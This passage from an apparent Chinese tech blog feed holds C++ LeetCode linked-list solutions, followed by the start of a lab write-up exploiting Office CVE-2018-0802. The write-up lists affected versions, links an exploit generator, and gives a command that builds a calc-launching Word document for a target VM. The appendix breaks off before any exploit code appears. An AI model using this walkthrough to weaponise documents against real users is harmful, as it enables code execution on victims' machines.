class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) {}</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) {}</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//快慢指针找中点，同上一题 </span></span><br><span class="line">    <span class="comment">//148 143 141都有快慢指针</span></span><br><span class="line">    <span class="function">ListNode * <span class="title">findMiddle</span><span class="params">(ListNode *head)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        ListNode *slow,*fast;</span><br><span class="line">        slow=head;</span><br><span class="line">        fast=head;</span><br><span class="line">        <span class="comment">//如果是偶数个节点，返回中间偏右的位置 </span></span><br><span class="line">        <span class="comment">//你改成fast=head-&gt;next返回中间偏左也是对的</span></span><br><span class="line">        <span class="comment">//有趣吧，画个图就知道了</span></span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">NULL</span>&amp;&amp;fast-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            slow=slow-&gt;next;</span><br><span class="line">            fast=fast-&gt;next-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//合并两个链表</span></span><br><span class="line">    <span class="function">ListNode * <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1,ListNode*l2)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        ListNode* dummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        <span class="type">bool</span>  toggle =<span class="literal">true</span>;</span><br><span class="line">        ListNode *head=dummy;</span><br><span class="line">        <span class="comment">//间断连接两个链表</span></span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">NULL</span>&amp;&amp;l2!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(toggle)</span><br><span class="line">            {</span><br><span class="line">                head-&gt;next=l1;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                head-&gt;next=l2;</span><br><span class="line">                l2=l2-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            toggle=!toggle;</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//连接剩下的节点</span></span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            head-&gt;next=l1;</span><br><span class="line">            l1=l1-&gt;next;</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">while</span>(l2!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            head-&gt;next=l2;</span><br><span class="line">            l2=l2-&gt;next;</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reorderList</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>||head-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//找到中点 断开</span></span><br><span class="line">        ListNode *middle=<span class="built_in">findMiddle</span>(head);</span><br><span class="line">        ListNode *tail=middle-&gt;next;</span><br><span class="line">        middle-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//翻转链表</span></span><br><span class="line">        ListNode *cur,*pre;</span><br><span class="line">        pre=tail;</span><br><span class="line">        cur=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(pre!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            ListNode *temp=pre;</span><br><span class="line">            pre=pre-&gt;next;</span><br><span class="line">            temp-&gt;next=cur;</span><br><span class="line">            cur=temp;</span><br><span class="line">        }</span><br><span class="line">        tail=cur;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//合并链表</span></span><br><span class="line">        head-&gt;next=<span class="built_in">mergeTwoLists</span>(head,tail)-&gt;next;                </span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="141-环形链表"><a href="#141-环形链表" class="headerlink" title="141. 环形链表"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle/">141. 环形链表</a></h4><blockquote><p>给定一个链表，判断链表中是否有环。</p><p>为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。</p></blockquote><blockquote><p> 示例 1：</p><p> 输入：head = [3,2,0,-4], pos = 1</p><p> 输出：true</p><p> 解释：链表中有一个环，其尾部连接到第二个节点。</p><p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/26939/circularlinkedlistss.png" alt="img"></p><p> 示例 2：</p><p> 输入：head = [1,2], pos = 0</p><p> 输出：true</p><p> 解释：链表中有一个环，其尾部连接到第一个节点。</p><p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/26939/circularlinkedlist_test2.png" alt="img"></p><p> 示例 3：</p><p> 输入：head = [1], pos = -1<br> 输出：false<br> 解释：链表中没有环。</p><p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/26939/circularlinkedlist_test3.png" alt="img"></p></blockquote><p>快慢指针即可，就像你在操场跑步，操场有环，只要你和她速度不一样，你们总能与她相遇，如果是直线，她到了终点，你就再也追不上她</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//148 143 141 142都有快慢指针</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        ListNode *fast,*slow;</span><br><span class="line">        slow=head;</span><br><span class="line">        fast=head;</span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">NULL</span>&amp;&amp;fast-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            slow=slow-&gt;next;</span><br><span class="line">            fast=fast-&gt;next-&gt;next;</span><br><span class="line">            <span class="comment">// 比较指针是否相等</span></span><br><span class="line">            <span class="keyword">if</span>(slow==fast)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="142-环形链表-II"><a href="#142-环形链表-II" class="headerlink" title="142. 环形链表 II"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">142. 环形链表 II</a></h4><blockquote><p>给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。</p><p>为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。</p><p>说明：不允许修改给定的链表。</p><p>示例 ：</p><p>输入：head = [3,2,0,-4], pos = 1<br>输出：tail connects to node index 1<br>解释：链表中有一个环，其尾部连接到第二个节点。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/26939/circularlinkedlist.png" alt="img"></p></blockquote><p>。</p><h5 id="Floyd-算法"><a href="#Floyd-算法" class="headerlink" title="Floyd 算法"></a>Floyd 算法</h5><p>你在操场跑步，操场有环，只要你和她速度不一样，你们总能与她相遇，如果是直线，她到了终点，你就再也追不上她。此题分为两个阶段，第一个阶段先用快慢指针测试是否有环，第二阶段慢指针回到头head,然后各自以相同速度前进，相遇点即为入环处（可以自己画图尝试）。严格的数学证明可参考leetcode官方题解。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        ListNode *slow,*fast;</span><br><span class="line">        slow=head;</span><br><span class="line">        fast=head;<span class="comment">//如果这里是fast=fast-&gt;next，那么下面该怎么改？</span></span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">NULL</span>&amp;&amp;fast-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            slow=slow-&gt;next;</span><br><span class="line">            fast=fast-&gt;next-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(slow==fast)</span><br><span class="line">            {</span><br><span class="line">                <span class="comment">//回到起点，各自以相同速度前进</span></span><br><span class="line">                slow=head;</span><br><span class="line">                <span class="keyword">while</span>(slow!=fast)</span><br><span class="line">                {</span><br><span class="line">                    slow=slow-&gt;next;</span><br><span class="line">                    fast=fast-&gt;next;</span><br><span class="line"></span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">return</span> slow;</span><br><span class="line">            }                        </span><br><span class="line">        }     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="234-回文链表"><a href="#234-回文链表" class="headerlink" title="234. 回文链表"></a><a href="https://leetcode-cn.com/problems/palindrome-linked-list/">234. 回文链表</a></h4><blockquote><p>请判断一个链表是否为回文链表。</p><p><strong>示例 1:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;输入: 1-&gt;2</span><br><span class="line">&gt;输出: false</span><br></pre></td></tr></tbody></table></figure><p><strong>示例 2:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;输入: 1-&gt;2-&gt;2-&gt;1</span><br><span class="line">&gt;输出: true</span><br></pre></td></tr></tbody></table></figure></blockquote><p>先找到链表中点，然后后面的翻转链表，一个个比较。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>||head-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        ListNode *slow,*fast;</span><br><span class="line">        slow=head;</span><br><span class="line">        fast=head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">NULL</span>&amp;&amp;fast-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            slow=slow-&gt;next;</span><br><span class="line">            fast=fast-&gt;next-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//偶数长度slow是中间偏左的节点</span></span><br><span class="line">        <span class="comment">//奇数长度slow是中点</span></span><br><span class="line"></span><br><span class="line">        ListNode *cur,*pre,*tail,*temp;</span><br><span class="line"><span class="comment">//分离两个链表</span></span><br><span class="line">        tail=slow-&gt;next;</span><br><span class="line">        slow-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//翻转链表</span></span><br><span class="line">        pre=tail;</span><br><span class="line">        cur=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(pre!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            temp=pre;</span><br><span class="line">            pre=pre-&gt;next;</span><br><span class="line">            temp-&gt;next=cur;</span><br><span class="line">            cur=temp;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//原链表的最后一个节点现在变成头结点</span></span><br><span class="line">        tail=cur;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="literal">NULL</span>&amp;&amp;tail!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(tail-&gt;val!=head-&gt;val)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line">            tail=tail-&gt;next;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="138-复制带随机指针的链表"><a href="#138-复制带随机指针的链表" class="headerlink" title="138. 复制带随机指针的链表"></a><a href="https://leetcode-cn.com/problems/copy-list-with-random-pointer/">138. 复制带随机指针的链表</a></h4><blockquote><p>给定一个链表，每个节点包含一个额外增加的随机指针，该指针可以指向链表中的任何节点或空节点。</p><p>要求返回这个链表的 深拷贝。 </p><p>我们用一个由 n 个节点组成的链表来表示输入/输出中的链表。每个节点用一个 [val, random_index] 表示：</p><p>val：一个表示 Node.val 的整数。<br>random_index：随机指针指向的节点索引（范围从 0 到 n-1）；如果不指向任何节点，则为  null 。</p></blockquote><p>复制节点跟在原节点后面即可</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node {</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    Node* next;</span></span><br><span class="line"><span class="comment">    Node* random;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node(int _val) {</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        next = NULL;</span></span><br><span class="line"><span class="comment">        random = NULL;</span></span><br><span class="line"><span class="comment">    }</span></span><br><span class="line"><span class="comment">};</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">copyRandomList</span><span class="params">(Node* head)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="keyword">auto</span> cur=head;</span><br><span class="line">        <span class="comment">//复制节点到后面</span></span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">auto</span> clone=<span class="keyword">new</span> <span class="built_in">Node</span>(cur-&gt;val);</span><br><span class="line">            clone-&gt;next=cur-&gt;next;</span><br><span class="line">            clone-&gt;random=cur-&gt;random;</span><br><span class="line">            cur-&gt;next=clone;</span><br><span class="line">            cur=clone-&gt;next;</span><br><span class="line">        }</span><br><span class="line">         <span class="comment">//处理random指针</span></span><br><span class="line">        cur=head;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;random!=<span class="literal">NULL</span>)</span><br><span class="line">            {</span><br><span class="line">                cur-&gt;next-&gt;random=cur-&gt;random-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            cur=cur-&gt;next-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//分离链表</span></span><br><span class="line">        cur=head;</span><br><span class="line">        <span class="keyword">auto</span> cloneHead=cur-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>&amp;&amp;cur-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">auto</span> temp=cur-&gt;next;</span><br><span class="line">            cur-&gt;next=cur-&gt;next-&gt;next;</span><br><span class="line">            cur=temp;</span><br><span class="line">            </span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> cloneHead;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> cpp </tag>
        
            
            
        <tag> 算法 </tag>
        
            
            
        <tag> 数据结构 </tag>
        
            
            
        <tag> 链表 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>记一次CVE-2018-0802漏洞的简单利用</title>
      
      
      <link href="/cn/posts/63237/"/>
      
      
      <url>/cn/posts/63237/</url>
      
      
        
      <content type="html"><![CDATA[<p>受影响的版本</p><blockquote><p>Microsoft Office 2007 Service Pack 3</p><p>Microsoft Office 2010 Service Pack 2 (32-bit editions)</p><p>Microsoft Office 2010 Service Pack 2 (64-bit editions)</p><p>Microsoft Office 2013 Service Pack 1 (32-bit editions)</p><p>Microsoft Office 2013 Service Pack 1 (64-bit editions)</p><p>Microsoft Office 2016 (32-bit edition)</p><p>Microsoft Office 2016 (64-bit edition)</p><p>Microsoft Office 2016 Click-to-Run (C2R) for 32-bit editions</p><p>Microsoft Office 2016 Click-to-Run (C2R) for 64-bit editions</p><p>Microsoft Office Compatibility Pack Service Pack 3</p><p>Microsoft Word 2007 Service Pack 3</p><p>Microsoft Word 2010 Service Pack 2 (32-bit editions)</p><p>Microsoft Word 2010 Service Pack 2 (64-bit editions)</p><p>Microsoft Word 2013 RT Service Pack 1 </p><p>Microsoft Word 2013 Service Pack 1 (32-bit editions)</p><p>Microsoft Word 2013 Service Pack 1 (64-bit editions)</p><p>Microsoft Word 2016 (32-bit edition)</p><p>Microsoft Word 2016 (64-bit edition)</p></blockquote><p>这个漏洞需要打了CVE-2017-11882的补丁后才有效。</p><p>首先准备好用于生成利用漏洞的文件</p><p>在这里下载：<a href="https://github.com/Ridter/RTF_11882_0802">https://github.com/Ridter/RTF_11882_0802</a></p><p>或者直接复制<a href="#%E9%99%84%E5%BD%95">附录</a>的内容存为对应文件：</p><p>然后执行：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RTF_11882_0802.py -c "cmd.exe /c calc.exe" -o test.doc</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/63237/image-20200622204154770.png" alt="image-20200622204154770"></p><p>将文件复制到靶机，我这里为了方便直接复制到kali自带的Apache里面让靶机去下载了。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/63237/image-20200621213913982.png" alt="image-20200621213913982"></p><p>打开刚刚我们生成的文件后就会发现打开word的同时启动了计算器。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/63237/image-20200622204008081.png" alt="image-20200622204008081"></p><h5 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h5><p>RTF_11882_0802.py 的代码</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span 